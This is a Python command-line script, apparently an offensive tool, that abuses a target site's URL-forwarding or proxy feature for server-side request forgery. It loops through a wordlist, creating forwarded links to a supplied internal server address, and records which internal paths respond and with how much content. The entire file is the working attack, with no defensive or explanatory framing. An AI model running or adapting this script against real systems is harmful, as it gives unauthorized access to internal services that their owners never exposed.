import argparse
import requests
import time

def count_words(wordlist_a):
    with open(wordlist_a, 'r') as fp:
        for count, line in enumerate(fp):
            pass
    return count

def internal_request(internal_link):
    response = requests.get(internal_link.rstrip())
    if response.status_code == 200:
        len(response.text)
        res_tuple = (str(internal_link[internal_link.rindex('/')+1:]), len(response.text))
        return res_tuple


def api_request(urltarget, dynamic_section, wordlist_f, ms, internal):
    index = 1
    place_tracker = 1
    listing = open(wordlist_f, "r")
    list_count = count_words(wordlist_f)
    for word in listing:
        if word[0] == '#' or word[0] == '\n':
            place_tracker += 1
            continue
        place_tracker += 1
        response = requests.post(urltarget + dynamic_section + str(index), params={
            "forward_url": internal + word.rstrip(), "proxy_response": "true", "insecure_tls": "false",
            "expand_path": "true", "capacity": "1000"
        })
        if response.status_code == 201:
            temp = internal_request(urltarget.rsplit('/', urltarget.count('/') - 2)[0] + '/' + word)
            if temp is None:
                continue
            else:
                results.append(temp)
        time.sleep(ms / 1000.0)
        index += 1
        print(str(place_tracker) + ' out of ' + str(list_count))
    listing.close()


def parse_it():
    parser = argparse.ArgumentParser(description='Wordlist, url_link, ms')
    parser.add_argument('-w', type=str, help='Wordlist file')
    parser.add_argument('-target', type=str,
                        help='The static section of the url EX:) ~>http://target.com/<~your_created_link')
    parser.add_argument('-dynamic', type=str,
                        help='The dynamic section of the url EX:) http://target.com/~>your_created_link<~')
    parser.add_argument('-m', type=int, help='ms per request')
    parser.add_argument('-internal_target', type=str,
                        help='The internal web server address EX:) http://127.0.0.1/path/leading/to/search/')
    args = parser.parse_args()
    return args.w, args.target, args.dynamic, args.m, args.internal_target


if __name__ == '__main__':
    wordlist, target, dynamic, ms, internal_target = parse_it()
    #todo
    #Create a summary for the returned results.
    results = []
    api_request(target, dynamic, wordlist, ms, internal_target)